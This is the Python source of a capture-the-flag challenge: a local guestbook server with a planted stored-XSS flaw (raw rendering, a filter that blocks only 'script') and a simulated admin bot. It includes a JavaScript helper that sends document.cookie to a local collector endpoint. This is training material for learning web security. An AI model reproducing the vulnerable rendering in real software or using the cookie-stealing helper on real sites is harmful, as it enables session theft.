#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Challenge 06 — XSS: Stored + Filter Bypass (steal the admin cookie) · Hard · 250 pts
====================================================================================
A guestbook stores comments and renders them raw to everyone, including an admin bot.
A blacklist rejects any comment containing "script".

The admin bot (/admin/visit) is simulated server-side: it "views" the guestbook with its
cookie (admin_session=<FLAG>, not HttpOnly). Any stored comment whose markup would run an
event handler that reads document.cookie or calls steal() "executes", and the bot's cookie
lands in the local collector (/collect -> /collector). No external requests are made.

Run:  python3 app.py
"""
import os, sys, re, urllib.parse, html
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
import common
import socketserver

CID = "xss_hard"
C = common.CHALLENGE_BY_ID[CID]
FLAG = C["flag"]
ADMIN_COOKIE = f"admin_session={FLAG}"

COMMENTS = [("sara", "Great service, thanks!"), ("ahmed", "Can you add dark mode? (oh wait)")]
STOLEN = []  # local collector log
MAX_COMMENTS, MAX_LEN = 50, 500

# An HTML element carrying an inline event handler whose code exfiltrates the cookie.
EVENT_HANDLER = re.compile(r"<[a-z][^>]*\son[a-z]+\s*=\s*[\"']?[^>]*(steal\s*\(|document\.cookie)", re.I)

STEAL_JS = """
<script>
// Helper available on every guestbook page: "exfiltrates" document.cookie to the local collector.
function steal() { new Image().src = '/collect?c=' + encodeURIComponent(document.cookie); }
</script>"""


class Handler(common.CTFHandler):
    CHALLENGE_ID = CID

    def do_GET(self):
        u = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(u.query, keep_blank_values=True)
        result = qs.get("result", [None])[0]
        if u.path == "/":
            self.guestbook(result, msg=qs.get("msg", [""])[0])
            return
        if u.path == "/collect":
            c = qs.get("c", [""])[0][:300]
            STOLEN.append(c)
            del STOLEN[:-20]
            self.send_response(204); self.end_headers()
            return
        if u.path == "/collector":
            self.collector(result)
            return
        if u.path == "/admin/visit":
            self.admin_visit(result)
            return
        self.send_html(common.render("<p>404</p>", C["title"], self.challenge), 404)

    def do_POST(self):
        if self.path == "/submit":
            self.handle_flag_submit()
            return
        if self.path == "/comment":
            length = int(self.headers.get("Content-Length", 0))
            data = urllib.parse.parse_qs(self.rfile.read(length).decode("utf-8", "replace"))
            name = data.get("name", ["anon"])[0][:40] or "anon"
            text = data.get("comment", [""])[0][:MAX_LEN]

            # ======= VULN HERE =======
            # Blacklist filter: only blocks the word "script". Event handlers sail through,
            # and the comment is later rendered without encoding.
            # Fix: html.escape() on output (and sanitise on store), HttpOnly cookies, CSP.
            if "script" in text.lower() or "script" in name.lower():
                self.redirect("/?msg=" + urllib.parse.quote("Blocked by WAF: the word 'script' is not allowed."))
                return
            # ==========================
            COMMENTS.append((name, text))
            del COMMENTS[:-MAX_COMMENTS]
            self.redirect("/?msg=" + urllib.parse.quote("Comment posted."))
            return
        self.send_html(common.render("<p>404</p>", C["title"], self.challenge), 404)

    def render_comments(self):
        # Rendered RAW (stored XSS sink).
        return "".join(f"<div class='row'><span><b>{n}</b>: {t}</span></div>" for n, t in COMMENTS)

    def guestbook(self, result=None, msg=""):
        m = f"<p class='warn'>{html.escape(msg)}</p>" if msg else ""
        body = f"""
        {STEAL_JS}
        <p class="note">Leave a comment — the admin reviews the guestbook regularly.
           <a href="/admin/visit">Ask the admin to review now</a> ·
           <a href="/collector">Your collector log</a></p>
        {m}
        <form method="POST" action="/comment">
          <label>Name</label><input name="name" value="hacker" autocomplete="off">
          <label>Comment</label><textarea name="comment" rows="3"></textarea>
          <button type="submit">Post</button>
        </form>
        <h2>Comments</h2>
        {self.render_comments()}"""
        self.send_html(common.render(body, C["title"], self.challenge, result))

    def admin_visit(self, result=None):
        """Simulated admin browser: 'runs' event-handler payloads found in stored comments."""
        fired = 0
        for _, text in COMMENTS:
            if EVENT_HANDLER.search(text):
                STOLEN.append(ADMIN_COOKIE)
                fired += 1
        del STOLEN[:-20]
        if fired:
            msg = (f"<p class='ok'>🤖 Admin bot reviewed {len(COMMENTS)} comments. "
                   f"{fired} payload(s) executed in the admin's browser. Check your <a href='/collector'>collector</a>.</p>")
        else:
            msg = (f"<p class='note'>🤖 Admin bot reviewed {len(COMMENTS)} comments. Nothing interesting happened. "
                   "(The bot's cookie is readable by JS…)</p>")
        self.send_html(common.render(msg + "<p><a href='/'>Back to guestbook</a></p>",
                                     C["title"], self.challenge, result))

    def collector(self, result=None):
        rows = "".join(f"<div class='row'><code>{html.escape(s)}</code></div>" for s in reversed(STOLEN)) \
            or "<p class='note'>Nothing collected yet.</p>"
        flag = f"<div class='flag'>🚩 {html.escape(FLAG)}</div>" if any(FLAG in s for s in STOLEN) else ""
        body = f"""
        <h2>Collector log</h2>
        <p class="note">Requests received at <code>/collect?c=...</code> (your local attacker server).</p>
        {rows}{flag}
        <p><a href="/">Back to guestbook</a></p>"""
        self.send_html(common.render(body, C["title"], self.challenge, result))


def main():
    common._db().close()
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    socketserver.ThreadingTCPServer.daemon_threads = True
    with socketserver.ThreadingTCPServer(("127.0.0.1", C["port"]), Handler) as httpd:
        print(f"[{CID}] http://127.0.0.1:{C['port']}  ({C['difficulty']}, {C['points']} pts)")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass


if __name__ == "__main__":
    main()
